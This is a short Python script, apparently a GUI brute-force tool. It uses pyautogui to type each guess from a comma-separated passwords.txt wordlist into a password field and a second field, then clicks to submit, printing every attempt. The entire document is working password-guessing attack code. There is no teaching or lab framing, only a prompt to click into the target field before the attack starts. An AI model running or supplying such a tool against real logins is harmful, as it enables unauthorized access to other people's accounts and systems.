#!/usr/bin/python

import datetime
import time
import pyautogui

def textprompt():
    x = pyautogui.confirm('Click OK to begin then click in the password field. Brute force starts after 5 seconds. Cancel to Exit.')
    if x == 'Cancel':
        exit()
    else:
        passcrack('passwords.txt')

def passcrack(file_name):
    word_file = open(file_name,'r')
    words = word_file.read()
    word_file.close()
    word_list = words.split(',')
    time.sleep(5)
    for word in word_list[0::]:
        pyautogui.hotkey('ctrl','a')
        pyautogui.typewrite(word, interval=0.0001)
        pyautogui.press('tab', 1)
        pyautogui.hotkey('ctrl','a')
        pyautogui.typewrite(word, interval=0.0001)
        pyautogui.click(button='left')
        print(word)

textprompt()